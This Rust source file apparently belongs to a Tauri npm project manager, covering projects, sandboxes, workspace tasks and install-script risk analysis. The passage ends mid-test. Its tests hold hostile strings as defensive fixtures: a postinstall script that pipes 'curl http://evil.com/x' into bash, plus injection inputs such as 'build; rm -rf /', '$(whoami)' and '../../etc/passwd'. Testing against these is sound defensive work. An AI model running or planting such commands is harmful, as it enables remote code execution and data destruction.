use crate::error::AppError;
use crate::models::project::{PackageInfo, Project};
use crate::state::app_state::{AppState, LockExt, LogLevel};
use serde::Serialize;
use std::fs;
use std::path::Path;
use tauri::State;

use crate::services::project::{detect_pm, scan_packages};

static DIR_SIZE_CACHE: once_cell::sync::Lazy<std::sync::Mutex<std::collections::HashMap<String, (f64, std::time::Instant)>>> =
    once_cell::sync::Lazy::new(|| std::sync::Mutex::new(std::collections::HashMap::new()));

fn get_size_cached(path: &str) -> Option<f64> {
    let cache = DIR_SIZE_CACHE.lock().unwrap();
    if let Some((size, timestamp)) = cache.get(path) {
        if timestamp.elapsed() < std::time::Duration::from_secs(60) {
            return Some(*size);
        }
    }
    None
}

fn set_size_cached(path: &str, size: f64) {
    let mut cache = DIR_SIZE_CACHE.lock().unwrap();
    cache.insert(path.to_string(), (size, std::time::Instant::now()));
}

/// Pure, blocking project builder — no AppState reference, safe to pass into
/// `spawn_blocking`. Reads the file system synchronously but never touches any
/// Mutex, so it cannot deadlock or starve the async runtime.
fn build_project(
    path: String,
    only_cli: Option<bool>,
    default_pm: String,
) -> Result<Project, AppError> {
    let project_path = Path::new(&path);

    if !project_path.exists() {
        return Err(AppError::Generic("Project path does not exist".to_string()));
    }

    let package_json_path = project_path.join("package.json");
    if !package_json_path.exists() {
        return Err(AppError::Generic(
            "No package.json found in the specified directory".to_string(),
        ));
    }

    let package_json_content = fs::read_to_string(&package_json_path)
        .map_err(|e| AppError::Generic(format!("Failed to read package.json: {}", e)))?;

    let package_json: serde_json::Value = serde_json::from_str(&package_json_content)
        .map_err(|e| AppError::Generic(format!("Failed to parse package.json: {}", e)))?;

    let name = package_json["name"]
        .as_str()
        .unwrap_or("unknown")
        .to_string();

    let mut package_manager = detect_pm(project_path);
    if package_manager == crate::models::project::PackageManager::Unknown {
        package_manager = match default_pm.as_str() {
            "pnpm" => crate::models::project::PackageManager::Pnpm,
            "yarn" => crate::models::project::PackageManager::Yarn,
            _ => crate::models::project::PackageManager::Npm,
        };
    }

    let mut packages = scan_packages(project_path, &[]);
    if only_cli.unwrap_or(false) {
        packages.retain(|pkg| pkg.has_cli);
    }

    let workspace_tool = crate::utils::workspace_resolver::detect_workspace_tool(project_path);

    Ok(Project {
        id: uuid::Uuid::new_v4().to_string(),
        name,
        path: path.clone(),
        package_manager,
        packages,
        ignored_packages: Vec::new(),
        only_cli: only_cli.unwrap_or(false),
        workspace_tool,
        created_at: chrono::Utc::now(),
        last_accessed: chrono::Utc::now(),
    })
}

/// Legacy sync wrapper kept for unit-test compatibility.
pub fn add_project_impl(
    path: String,
    only_cli: Option<bool>,
    app_state: &AppState,
) -> Result<Project, AppError> {
    let default_pm = app_state
        .persistent
        .lock_safe()
        .config
        .clone()
        .unwrap_or_default()
        .general
        .default_package_manager
        .clone();

    let project = build_project(path, only_cli, default_pm)?;

    app_state
        .persistent
        .lock_safe()
        .projects
        .push(project.clone());
    app_state.save();

    Ok(project)
}

#[tauri::command]
#[specta::specta]

pub async fn add_project(
    path: String,
    only_cli: Option<bool>,
    state: State<'_, AppState>,
) -> Result<Project, AppError> {
    // 1. Read config while holding the lock for the shortest possible time.
    let default_pm = state
        .persistent
        .lock_safe()
        .config
        .clone()
        .unwrap_or_default()
        .general
        .default_package_manager
        .clone();

    // 2. Run ALL blocking file-system work on a dedicated blocking thread so
    //    the async runtime (and therefore the UI) stays fully responsive.
    let project = tokio::task::spawn_blocking(move || {
        build_project(path, only_cli, default_pm)
    })
    .await
    .map_err(|e| AppError::Generic(format!("Task join error: {}", e)))??;

    // 3. Commit the result to state (fast, just a Vec push + flag set).
    {
        state
            .persistent
            .lock_safe()
            .projects
            .push(project.clone());
        state.save();
    }

    state.add_log(
        LogLevel::Success,
        format!("Added project \"{}\"", project.name),
        "ProjectManager".to_string(),
    );
    Ok(project)
}

pub fn remove_project_impl(project_id: String, app_state: &AppState) -> Result<(), AppError> {
    app_state
        .persistent
        .lock_safe()
        .projects
        .retain(|p| p.id != project_id);
    app_state.save();
    Ok(())
}

#[tauri::command]
#[specta::specta]

pub async fn remove_project(
    project_id: String,
    state: State<'_, AppState>,
    pty_state: State<'_, crate::state::app_state::PtyState>,
) -> Result<(), AppError> {
    let project = {
        state
            .persistent
            .lock_safe()
            .projects
            .iter()
            .find(|p| p.id == project_id)
            .map(|p| (p.name.clone(), p.path.clone()))
    };

    if let Some((_, path)) = &project {
        let links_to_remove = {
            let links = state.persistent.lock_safe().active_links.clone();
            find_links_for_project(&links, path)
        };
        for link_id in links_to_remove {
            crate::commands::link::remove_link_internal_logic(link_id, &state, &pty_state).await?;
        }
    }

    match remove_project_impl(project_id, &state) {
        Ok(()) => {
            let name = project
                .map(|(name, _)| name)
                .unwrap_or_else(|| "project".to_string());
            state.add_log(
                LogLevel::Success,
                format!("Removed project \"{}\"", name),
                "ProjectManager".to_string(),
            );
            Ok(())
        }
        Err(e) => {
            state.add_log(
                LogLevel::Error,
                format!("Failed to remove project: {}", e),
                "ProjectManager".to_string(),
            );
            Err(e)
        }
    }
}

/// Compares filesystem paths the way the OS would: trailing separators
/// don't matter, and on Windows the comparison is case-insensitive.
/// `target_path` is entered independently of a project's stored `path`
/// (a free-text field / OS folder dialog, not a dropdown tied to it), so
/// an exact string comparison silently drops matches on nothing more than
/// a casing or trailing-slash difference.
fn paths_match(a: &str, b: &str) -> bool {
    fn normalize(p: &str) -> String {
        // Unify separators first: a path typed with forward slashes (or
        // copy-pasted from a different tool) must still match one that came
        // from a native Windows folder dialog, which always uses backslashes.
        let unified = p.replace('\\', "/");
        let trimmed = unified.trim_end_matches('/');
        if cfg!(windows) {
            trimmed.to_lowercase()
        } else {
            trimmed.to_string()
        }
    }
    normalize(a) == normalize(b)
}

fn find_links_for_project(
    links: &[crate::models::link::LinkEntry],
    project_path: &str,
) -> Vec<String> {
    // A project can be either side of a link: the source (the package being
    // developed) or the target (the project it's linked into). Deleting the
    // project must clean up the link either way.
    links
        .iter()
        .filter(|l| {
            paths_match(&l.target_path, project_path) || paths_match(&l.source_path, project_path)
        })
        .map(|l| l.id.clone())
        .collect()
}

fn find_links_for_package_in_project(
    links: &[crate::models::link::LinkEntry],
    package_name: &str,
    project_path: &str,
) -> Vec<String> {
    links
        .iter()
        .filter(|l| l.source_package == package_name && paths_match(&l.target_path, project_path))
        .map(|l| l.id.clone())
        .collect()
}

#[tauri::command]
#[specta::specta]

pub async fn remove_package(
    project_id: String,
    package_name: String,
    state: State<'_, AppState>,
    pty_state: State<'_, crate::state::app_state::PtyState>,
) -> Result<(), AppError> {
    let project_path = {
        state
            .persistent
            .lock_safe()
            .projects
            .iter()
            .find(|p| p.id == project_id)
            .map(|p| p.path.clone())
    };

    let links_to_remove = if let Some(path) = project_path.as_ref() {
        let links = state.persistent.lock_safe().active_links.clone();
        find_links_for_package_in_project(&links, &package_name, path)
    } else {
        Vec::new()
    };

    for link_id in links_to_remove {
        crate::commands::link::remove_link_internal_logic(link_id, &state, &pty_state).await?;
    }

    let project_name = {
        let mut persistent = state.persistent.lock_safe();
        if let Some(project) = persistent.projects.iter_mut().find(|p| p.id == project_id) {
            project.packages.retain(|pkg| pkg.name != package_name);
            if !project.ignored_packages.contains(&package_name) {
                project.ignored_packages.push(package_name.clone());
            }
            Some(project.name.clone())
        } else {
            None
        }
    };

    if let Some(name) = project_name {
        state.save();
        state.add_log(
            LogLevel::Success,
            format!("Removed package \"{}\" from \"{}\"", package_name, name),
            "ProjectManager".to_string(),
        );
    }
    Ok(())
}

#[tauri::command]
#[specta::specta]

pub async fn list_projects(state: State<'_, AppState>) -> Result<Vec<Project>, AppError> {
    Ok(state.persistent.lock_safe().projects.clone())
}

#[tauri::command]
#[specta::specta]

pub async fn refresh_project(
    project_id: String,
    only_cli: bool,
    state: State<'_, AppState>,
) -> Result<Project, AppError> {
    let project_path_str = {
        let mut persistent_guard = state.persistent.lock_safe();
        let projects_guard = &mut persistent_guard.projects;
        let project = projects_guard
            .iter_mut()
            .find(|p| p.id == project_id)
            .ok_or_else(|| AppError::Generic("Project not found".into()))?;
        project.only_cli = only_cli;
        project.ignored_packages.clear();
        project.path.clone()
    };

    let (package_manager, res) = tokio::task::spawn_blocking(move || {
        let project_path = Path::new(&project_path_str);
        let package_manager = detect_pm(project_path);
        let mut res = scan_packages(project_path, &[]);
        
        if only_cli {
            res.retain(|pkg| pkg.has_cli);
        }
        (package_manager, res)
    })
    .await
    .map_err(|e| AppError::Generic(format!("Task join error: {}", e)))?;

    let mut persistent_guard = state.persistent.lock_safe();
    let projects_guard = &mut persistent_guard.projects;
    let project = projects_guard
        .iter_mut()
        .find(|p| p.id == project_id)
        .unwrap();
    project.packages = res;
    project.package_manager = package_manager;

    let updated_project = project.clone();
    drop(persistent_guard);
    state.save();
    Ok(updated_project)
}

#[tauri::command]
#[specta::specta]

pub async fn scan_project(
    path: String,
    _state: State<'_, AppState>,
) -> Result<Vec<PackageInfo>, String> {
    tokio::task::spawn_blocking(move || {
        let project_path = Path::new(&path);
        scan_packages(project_path, &[])
    })
    .await
    .map_err(|e| format!("Task join error: {}", e))
}

#[tauri::command(async)]
#[specta::specta]

pub fn create_sandbox(
    package_path: Option<String>,
    state: State<'_, AppState>,
) -> Result<String, AppError> {
    let result = create_sandbox_impl(package_path);
    match &result {
        Ok(path) => state.add_log(
            LogLevel::Success,
            format!("Created sandbox at {}", path),
            "ProjectManager".to_string(),
        ),
        Err(e) => state.add_log(
            LogLevel::Error,
            format!("Failed to create sandbox: {}", e),
            "ProjectManager".to_string(),
        ),
    }
    result
}

fn create_sandbox_impl(package_path: Option<String>) -> Result<String, AppError> {
    let temp_dir = std::env::temp_dir();
    let sandbox_dir = temp_dir
        .join("PackagePilot_Sandboxes")
        .join(format!("sandbox_{}", chrono::Utc::now().timestamp()));

    if !sandbox_dir.exists() {
        std::fs::create_dir_all(&sandbox_dir)?;
    }

    let package_json_content = serde_json::json!({
        "name": "packlab-sandbox",
        "version": "1.0.0",
        "description": "Auto-generated testing sandbox",
        "private": true,
        "scripts": {},
        "dependencies": {},
        "devDependencies": {},
        "keywords": [],
        "author": "",
        "license": "ISC"
    });

    let package_json_path = sandbox_dir.join("package.json");
    std::fs::write(
        package_json_path,
        serde_json::to_string_pretty(&package_json_content).unwrap(),
    )?;

    if let Some(pkg_path_str) = package_path {
        let pkg_path = std::path::Path::new(&pkg_path_str);
        let src_pkg_json_path = pkg_path.join("package.json");

        if let Ok(content) = std::fs::read_to_string(&src_pkg_json_path) {
            if let Ok(pkg) = serde_json::from_str::<serde_json::Value>(&content) {
                let pkg_name = pkg["name"].as_str().unwrap_or("unknown");

                let mut script_parts = Vec::new();
                script_parts.push(format!("console.log('📦 Testing package: {}');\nconst fs = require('fs');\ntry {{\n  console.log('Installed modules:', fs.readdirSync('node_modules').join(', '));\n}} catch(e) {{}}", pkg_name));

                let has_bin = pkg.get("bin").is_some();
                let has_main = pkg.get("main").is_some() || pkg.get("exports").is_some();

                if has_bin {
                    let (bin_name, bin_path) = match pkg.get("bin") {
                        Some(serde_json::Value::Object(map)) => {
                            if let Some((k, v)) = map.iter().next() {
                                (k.to_string(), v.as_str().unwrap_or("").to_string())
                            } else {
                                (pkg_name.to_string(), "".to_string())
                            }
                        }
                        Some(serde_json::Value::String(val)) => {
                            (pkg_name.to_string(), val.to_string())
                        }
                        _ => (pkg_name.to_string(), "".to_string()),
                    };

                    // Clean up the path (e.g. ./dist/cli.js -> dist/cli.js)
                    let clean_bin_path = bin_path.trim_start_matches("./");

                    script_parts.push(format!("console.log('\\n🚀 Detected CLI package. Running `{}`...');\nconst {{ execSync }} = require('child_process');\nconst path = require('path');\ntry {{\n  const binPath = path.join(process.cwd(), 'node_modules', '{}', '{}');\n  const output = execSync(`node \"${{binPath}}\" --help`, {{ encoding: 'utf-8', stdio: 'pipe' }});\n  console.log(output);\n}} catch (e) {{\n  console.error('❌ CLI execution failed:', e.message || e);\n  if (e.stdout) console.log(e.stdout);\n  if (e.stderr) console.error(e.stderr);\n}}", bin_name, pkg_name, clean_bin_path));
                }

                if has_main || !has_bin {
                    script_parts.push(format!("(async () => {{\n  try {{\n    console.log('\\n📚 Attempting to import as library...');\n    const pkg = await import('{}');\n    console.log('✅ Successfully loaded package!');\n    console.log('Exports:', Object.keys(pkg));\n  }} catch (e) {{\n    console.error('❌ Failed to load package:', e.message || e);\n  }}\n}})();", pkg_name));
                }

                let index_js_path = sandbox_dir.join("index.js");
                let _ = std::fs::write(index_js_path, script_parts.join("\n\n"));
            }
        }
    }

    Ok(sandbox_dir.to_string_lossy().to_string())
}

const STALE_SANDBOX_MAX_AGE: std::time::Duration = std::time::Duration::from_secs(24 * 60 * 60);

/// Remove sandbox directories under `base` that are older than
/// `STALE_SANDBOX_MAX_AGE`. Called once at app startup so a crash (or a
/// force-quit) doesn't leave `%TEMP%\PackagePilot_Sandboxes` growing forever.
pub fn cleanup_stale_sandboxes(base: &Path) {
    let Ok(entries) = std::fs::read_dir(base) else {
        return;
    };

    for entry in entries.flatten() {
        let Ok(metadata) = entry.metadata() else {
            continue;
        };
        let Ok(modified) = metadata.modified() else {
            continue;
        };
        let Ok(age) = modified.elapsed() else {
            continue;
        };

        if age > STALE_SANDBOX_MAX_AGE {
            if let Ok(safe) = crate::utils::safe_path::SafePath::new(entry.path(), base) {
                let _ = safe.safe_remove_all();
            }
        }
    }
}

#[tauri::command]
#[specta::specta]

pub async fn run_sandbox_script(target_path: String) -> Result<String, AppError> {
    let sandbox_base = std::env::temp_dir().join("PackagePilot_Sandboxes");

    let safe_path =
        crate::utils::safe_path::SafePath::new(&target_path, &sandbox_base).map_err(|_| {
            AppError::Generic(
                "Sandbox target path is invalid or outside the sandbox directory.".to_string(),
            )
        })?;

    let path_str = safe_path.as_path().to_string_lossy().to_string();
    let output = crate::services::shell::run_command_raw(
        "node",
        &["index.js"],
        &path_str,
        std::time::Duration::from_secs(60),
    )
    .await?;

    let mut result = String::new();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    if !stdout.is_empty() {
        result.push_str(&stdout);
    }
    if !stderr.is_empty() {
        if !result.is_empty() {
            result.push('\n');
        }
        result.push_str("--- STDERR ---\n");
        result.push_str(&stderr);
    }

    if result.is_empty() {
        if !output.status.success() {
            result = format!("Process exited with status: {}", output.status);
        } else {
            result = "Script executed successfully with no output.".to_string();
        }
    }

    Ok(result)
}

#[tauri::command]
#[specta::specta]

pub fn check_package_cli(path: String) -> bool {
    let pkg_json_path = std::path::Path::new(&path).join("package.json");
    if let Ok(content) = fs::read_to_string(&pkg_json_path) {
        if let Ok(pkg) = serde_json::from_str::<serde_json::Value>(&content) {
            return pkg.get("bin").is_some();
        }
    }
    false
}

#[derive(Debug, Serialize, specta::Type, Clone)]
pub struct ScriptInfo {
    pub name: String,
    pub command: String,
    pub is_lifecycle: bool,
    pub risk_level: String, // "low", "medium", "high"
    pub threat_categories: Vec<String>,
    pub risk_explanation: Option<String>,
}

#[tauri::command]
#[specta::specta]
pub fn get_package_scripts(path: String) -> Result<Vec<ScriptInfo>, AppError> {
    let pkg_json_path = Path::new(&path).join("package.json");
    let content = std::fs::read_to_string(&pkg_json_path)
        .map_err(|e| AppError::Generic(format!("Cannot read package.json: {}", e)))?;
    let pkg: serde_json::Value = serde_json::from_str(&content)
        .map_err(|e| AppError::Generic(format!("Cannot parse package.json: {}", e)))?;

    let mut scripts = Vec::new();
    if let Some(script_obj) = pkg.get("scripts").and_then(|s| s.as_object()) {
        for (name, command) in script_obj {
            let cmd_str = command.as_str().unwrap_or("");
            let analysis = crate::utils::script_analyzer::analyze_script(name, cmd_str);
            let is_lifecycle = analysis.risk_level == "medium"
                || matches!(
                    name.as_str(),
                    "preinstall"
                        | "install"
                        | "postinstall"
                        | "prepublish"
                        | "prepublishOnly"
                        | "prepare"
                        | "prepack"
                        | "postpack"
                        | "preuninstall"
                        | "uninstall"
                        | "postuninstall"
                );

            scripts.push(ScriptInfo {
                name: name.clone(),
                command: cmd_str.to_string(),
                is_lifecycle,
                risk_level: analysis.risk_level.to_string(),
                threat_categories: analysis.threat_categories,
                risk_explanation: Some(analysis.explanation),
            });
        }
    }
    Ok(scripts)
}

/// Rejects a task name that could break out of the command written into the
/// PTY shell. These strings are interpreted by a real shell, so metacharacters
/// are a genuine injection vector.
fn validate_task_name(task: &str) -> Result<(), AppError> {
    if task.is_empty() {
        return Err(AppError::Generic("Task name is required".to_string()));
    }
    if task.chars().any(char::is_whitespace) {
        return Err(AppError::Generic(
            "Task name cannot contain whitespace".to_string(),
        ));
    }
    crate::utils::validation::validate_shell_arg(task)
}

/// Command that runs `task` across every package in the workspace.
/// Pure so the per-tool matrix is unit-testable.
pub fn workspace_task_command(
    tool: &crate::models::project::WorkspaceTool,
    task: &str,
) -> Result<String, AppError> {
    use crate::models::project::WorkspaceTool as W;
    validate_task_name(task)?;
    Ok(match tool {
        W::Turbo => format!("npx turbo run {}", task),
        W::Lerna => format!("npx lerna run {}", task),
        W::Pnpm => format!("pnpm -r run {}", task),
        W::Yarn => format!("yarn workspaces run {}", task),
        W::Npm => format!("npm run {} --workspaces --if-present", task),
        W::None => {
            return Err(AppError::Generic(
                "This project is not a workspace, so workspace tasks cannot run".to_string(),
            ))
        }
    })
}

/// Command that runs `task` for a single package in the workspace.
pub fn package_task_command(
    tool: &crate::models::project::WorkspaceTool,
    task: &str,
    package_name: &str,
) -> Result<String, AppError> {
    use crate::models::project::WorkspaceTool as W;
    validate_task_name(task)?;
    crate::utils::validation::sanitize_package_name(package_name)?;
    Ok(match tool {
        W::Turbo => format!("npx turbo run {} --filter={}", task, package_name),
        W::Lerna => format!("npx lerna run {} --scope={}", task, package_name),
        W::Pnpm => format!("pnpm --filter {} run {}", package_name, task),
        W::Yarn => format!("yarn workspace {} run {}", package_name, task),
        W::Npm => format!("npm run {} --workspace={} --if-present", task, package_name),
        W::None => {
            return Err(AppError::Generic(
                "This project is not a workspace, so package tasks cannot run".to_string(),
            ))
        }
    })
}

#[tauri::command]
#[specta::specta]
pub async fn run_workspace_task(
    project_id: String,
    task: String,
    window: tauri::Window,
    state: tauri::State<'_, AppState>,
    pty_state: tauri::State<'_, crate::state::app_state::PtyState>,
) -> Result<String, AppError> {
    let project = {
        let persistent = state.persistent.lock_safe();
        persistent.projects.iter().find(|p| p.id == project_id).cloned()
    };

    let project = match project {
        Some(p) => p,
        None => return Err(AppError::Generic("Project not found".to_string())),
    };

    let command_str = workspace_task_command(&project.workspace_tool, &task)?;

    let session_id = uuid::Uuid::new_v4().to_string();

    crate::commands::pty::spawn_pty(window, pty_state.clone(), state.clone(), session_id.clone(), project.path.clone(), 120, 30)
        .map_err(AppError::Generic)?;

    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    let cmd_with_newline = format!("{}\r", command_str);
    crate::commands::pty::write_pty(pty_state, session_id.clone(), cmd_with_newline)
        .map_err(AppError::Generic)?;

    Ok(session_id)
}

#[tauri::command]
#[specta::specta]
pub async fn run_package_task(
    project_id: String,
    package_name: String,
    task: String,
    window: tauri::Window,
    state: tauri::State<'_, AppState>,
    pty_state: tauri::State<'_, crate::state::app_state::PtyState>,
) -> Result<String, AppError> {
    let project = {
        let persistent = state.persistent.lock_safe();
        persistent.projects.iter().find(|p| p.id == project_id).cloned()
    };

    let project = match project {
        Some(p) => p,
        None => return Err(AppError::Generic("Project not found".to_string())),
    };

    let command_str = package_task_command(&project.workspace_tool, &task, &package_name)?;

    let session_id = uuid::Uuid::new_v4().to_string();

    crate::commands::pty::spawn_pty(window, pty_state.clone(), state.clone(), session_id.clone(), project.path.clone(), 120, 30)
        .map_err(AppError::Generic)?;

    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    let cmd_with_newline = format!("{}\r", command_str);
    crate::commands::pty::write_pty(pty_state, session_id.clone(), cmd_with_newline)
        .map_err(AppError::Generic)?;

    Ok(session_id)
}

#[tauri::command]
#[specta::specta]
pub async fn run_security_audit(
    state: State<'_, AppState>,
    project_id: String,
) -> Result<String, String> {
    let project = {
        let persistent = state.persistent.lock_safe();
        persistent.projects.iter().find(|p| p.id == project_id).cloned()
    };

    let project = match project {
        Some(p) => p,
        None => return Err("Project not found".to_string()),
    };

    let program = match project.package_manager {
        crate::models::project::PackageManager::Npm => "npm",
        crate::models::project::PackageManager::Pnpm => "pnpm",
        crate::models::project::PackageManager::Yarn => "yarn",
        _ => return Err("Unsupported package manager for security audit".to_string()),
    };

    let cmd_name = crate::commands::cmd_name(program);
    let output = tokio::process::Command::new(cmd_name)
        .arg("audit")
        .arg("--json")
        .current_dir(&project.path)
        .output()
        .await;

    match output {
        Ok(out) => {
            let stdout_str = String::from_utf8_lossy(&out.stdout).to_string();
            if stdout_str.trim().is_empty() && !out.status.success() {
                let stderr_str = String::from_utf8_lossy(&out.stderr).to_string();
                return Err(format!("Command failed: {}", stderr_str));
            }
            Ok(stdout_str)
        }
        Err(e) => Err(format!("Failed to execute command: {}", e)),
    }
}

#[tauri::command]
#[specta::specta]
pub async fn get_directory_size(path: String) -> Result<f64, String> {
    if let Some(size) = get_size_cached(&path) {
        return Ok(size);
    }
    
    let path_clone = path.clone();
    let size = tokio::task::spawn_blocking(move || {
        let mut total_size = 0;
        let mut iterator = walkdir::WalkDir::new(&path_clone).into_iter();
        loop {
            let entry = match iterator.next() {
                Some(Ok(entry)) => entry,
                Some(Err(_)) => continue,
                None => break,
            };

            // Ignore .git and node_modules directories
            if entry.file_type().is_dir() && (entry.file_name() == ".git" || entry.file_name() == "node_modules") {
                iterator.skip_current_dir();
                continue;
            }

            if entry.file_type().is_file() {
                if let Ok(metadata) = entry.metadata() {
                    total_size += metadata.len();
                }
            }
        }
        total_size as f64
    })
    .await
    .map_err(|e| format!("Task join error: {}", e))?;
    
    set_size_cached(&path, size);
    Ok(size)
}

#[tauri::command]
#[specta::specta]
pub async fn get_directory_sizes(paths: Vec<String>) -> Result<std::collections::HashMap<String, f64>, String> {
    let mut results = std::collections::HashMap::new();
    let mut to_calculate = Vec::new();
    
    for path in paths {
        if let Some(size) = get_size_cached(&path) {
            results.insert(path, size);
        } else {
            to_calculate.push(path);
        }
    }
    
    if !to_calculate.is_empty() {
        let calculated = tokio::task::spawn_blocking(move || {
            let mut calc_results = std::collections::HashMap::new();
            for path in to_calculate {
                let mut total_size = 0;
                let mut iterator = walkdir::WalkDir::new(&path).into_iter();
                loop {
                    let entry = match iterator.next() {
                        Some(Ok(entry)) => entry,
                        Some(Err(_)) => continue,
                        None => break,
                    };

                    if entry.file_type().is_dir() && (entry.file_name() == ".git" || entry.file_name() == "node_modules") {
                        iterator.skip_current_dir();
                        continue;
                    }

                    if entry.file_type().is_file() {
                        if let Ok(metadata) = entry.metadata() {
                            total_size += metadata.len();
                        }
                    }
                }
                calc_results.insert(path, total_size as f64);
            }
            calc_results
        })
        .await
        .map_err(|e| format!("Task join error: {}", e))?;
        
        for (path, size) in calculated {
            set_size_cached(&path, size);
            results.insert(path, size);
        }
    }
    
    Ok(results)
}

#[cfg(test)]
mod workspace_task_tests {
    use super::*;
    use crate::models::project::WorkspaceTool as W;

    /// Every tool the UI renders task buttons for must produce a command.
    /// `WorkspaceTasks` shows the buttons whenever workspace_tool != None, so
    /// any tool rejected here is a button that silently does nothing.
    #[test]
    fn every_non_none_workspace_tool_supports_the_standard_tasks() {
        for tool in [W::Turbo, W::Lerna, W::Pnpm, W::Yarn, W::Npm] {
            for task in ["dev", "build", "test", "lint"] {
                let cmd = workspace_task_command(&tool, task).unwrap_or_else(|e| {
                    panic!("{:?} + {} should be supported, got {:?}", tool, task, e)
                });
                assert!(
                    cmd.contains(task),
                    "{:?} command {:?} should reference the task",
                    tool,
                    cmd
                );
            }
        }
    }

    #[test]
    fn every_non_none_workspace_tool_supports_package_scoped_tasks() {
        for tool in [W::Turbo, W::Lerna, W::Pnpm, W::Yarn, W::Npm] {
            let cmd = package_task_command(&tool, "dev", "@scope/api")
                .unwrap_or_else(|e| panic!("{:?} should support package tasks, got {:?}", tool, e));
            assert!(cmd.contains("@scope/api"), "got {:?}", cmd);
            assert!(cmd.contains("dev"), "got {:?}", cmd);
        }
    }

    #[test]
    fn pnpm_npm_and_yarn_use_their_own_native_workspace_syntax() {
        assert_eq!(
            workspace_task_command(&W::Pnpm, "build").unwrap(),
            "pnpm -r run build"
        );
        assert_eq!(
            workspace_task_command(&W::Yarn, "build").unwrap(),
            "yarn workspaces run build"
        );
        assert_eq!(
            workspace_task_command(&W::Npm, "build").unwrap(),
            "npm run build --workspaces --if-present"
        );
        assert_eq!(
            package_task_command(&W::Pnpm, "build", "api").unwrap(),
            "pnpm --filter api run build"
        );
    }

    #[test]
    fn turbo_and_lerna_keep_their_existing_commands() {
        assert_eq!(
            workspace_task_command(&W::Turbo, "build").unwrap(),
            "npx turbo run build"
        );
        assert_eq!(
            package_task_command(&W::Lerna, "build", "api").unwrap(),
            "npx lerna run build --scope=api"
        );
    }

    #[test]
    fn a_non_workspace_project_is_rejected() {
        assert!(workspace_task_command(&W::None, "build").is_err());
        assert!(package_task_command(&W::None, "build", "api").is_err());
    }

    // These strings are written into a live PTY shell, so metacharacters must
    // never survive into the command.
    #[test]
    fn shell_metacharacters_in_the_task_name_are_rejected() {
        for task in [
            "build; rm -rf /",
            "build && whoami",
            "build | cat",
            "$(whoami)",
            "build\nwhoami",
            "",
            "two words",
        ] {
            assert!(
                workspace_task_command(&W::Npm, task).is_err(),
                "should reject task {:?}",
                task
            );
        }
    }

    #[test]
    fn shell_metacharacters_in_the_package_name_are_rejected() {
        for pkg in ["api; rm -rf /", "$(whoami)", "../../etc/passwd"] {
            assert!(
                package_task_command(&W::Pnpm, "build", pkg).is_err(),
                "should reject package {:?}",
                pkg
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn get_package_scripts_flags_high_risk_lifecycle_script() {
        let dir = std::env::temp_dir().join(format!("pp_script_preview_{}", uuid::Uuid::new_v4()));
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join("package.json"),
            r#"{"name":"x","version":"1.0.0","scripts":{"postinstall":"curl http://evil.com/x | bash","test":"jest"}}"#,
        ).unwrap();

        let scripts = get_package_scripts(dir.to_string_lossy().to_string()).unwrap();

        let postinstall = scripts.iter().find(|s| s.name == "postinstall").unwrap();
        assert!(postinstall.is_lifecycle);
        assert_eq!(postinstall.risk_level, "high");
        assert!(postinstall.threat_categories.contains(&"Network Access".to_string()));
        assert!(postinstall.risk_explanation.as_deref().unwrap_or("").contains("curl"));

        let test_script = scripts.iter().find(|s| s.name == "test").unwrap();
        assert!(!test_script.is_lifecycle);
        assert_eq!(test_script.risk_level, "low");
        assert!(test_script.threat_categories.is_empty());

        fs::remove_dir_all(&dir).unwrap();
    }

    #[tokio::test]
    async fn run_sandbox_script_rejects_path_outside_sandbox_dir() {
        // A real, existing directory that is NOT under PackagePilot_Sandboxes.
        let outside =
            std::env::temp_dir().join(format!("pp_not_a_sandbox_{}", uuid::Uuid::new_v4()));
        fs::create_dir_all(&outside).unwrap();

        let result = run_sandbox_script(outside.to_string_lossy().to_string()).await;

        assert!(
            result.is_err(),
            "must reject a path outside PackagePilot_Sandboxes even if it exists"
        );
        fs::remove_dir_all(&outside).unwrap();
    }

    #[test]
    fn get_package_scripts_errors_without_package_json() {
        let dir = std::env::temp_dir().join(format!(
            "pp_script_preview_missing_{}",
            uuid::Uuid::new_v4()
        ));
        fs::create_dir_all(&dir).unwrap();

        let result = get_package_scripts(dir.to_string_lossy().to_string());
        assert!(result.is_err());

        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_add_and_remove_project_integration() {
        // Setup temporary directory
        let temp_dir = std::env::temp_dir().join(format!(
            "packlab_test_{}",
            chrono::Utc::now().timestamp_micros()
        ));
        fs::create_dir_all(&temp_dir).unwrap();

        // Write a mock package.json
        let pkg_json_path = temp_dir.join("package.json");
        fs::write(
            &pkg_json_path,
            r#"{
                "name": "integration-test-project",
                "version": "1.0.0"
            }"#,
        )
        .unwrap();

        // Create a fresh AppState
        let app_state = AppState::new();

        // Test 1: Add Project
        let path_str = temp_dir.to_string_lossy().to_string();
        let project = add_project_impl(path_str.clone(), None, &app_state).unwrap();

        assert_eq!(project.name, "integration-test-project");
        assert_eq!(app_state.persistent.lock_safe().projects.len(), 1);
        assert_eq!(app_state.persistent.lock_safe().projects[0].id, project.id);

        // Test 2: Remove Project
        remove_project_impl(project.id.clone(), &app_state).unwrap();
        assert_eq!(app_state.persistent.lock_safe().projects.len(), 0);

        // Cleanup
        fs::remove_dir_all(&temp_dir).unwrap();
    }

    #[test]
    fn test_find_links_for_package_in_project_scopes_correctly() {
        use crate::models::link::{LinkEntry, LinkMethod, LinkStatus};

        let project_a_path = "/fake/project-a".to_string();
        let project_b_path = "/fake/project-b".to_string();

        let links = vec![
            LinkEntry {
                id: "link-1".to_string(),
                source_package: "my-lib".to_string(),
                source_path: "/fake/my-lib".to_string(),
                target_project: "project-a".to_string(),
                target_path: project_a_path.clone(),
                method: LinkMethod::Symlink,
                status: LinkStatus::Active,
                watch_enabled: false,
                created_at: chrono::Utc::now(),
                last_synced: None,
                has_cli: false,
            },
            LinkEntry {
                id: "link-2".to_string(),
                source_package: "my-lib".to_string(),
                source_path: "/fake/my-lib".to_string(),
                target_project: "project-b".to_string(),
                target_path: project_b_path.clone(),
                method: LinkMethod::Symlink,
                status: LinkStatus::Active,
                watch_enabled: false,
                created_at: chrono::Utc::now(),
                last_synced: None,
                has_cli: false,
            },
        ];

        let result = find_links_for_package_in_project(&links, "my-lib", &project_a_path);
        assert_eq!(result.len(), 1);
        assert_eq!(result[0], "link-1");
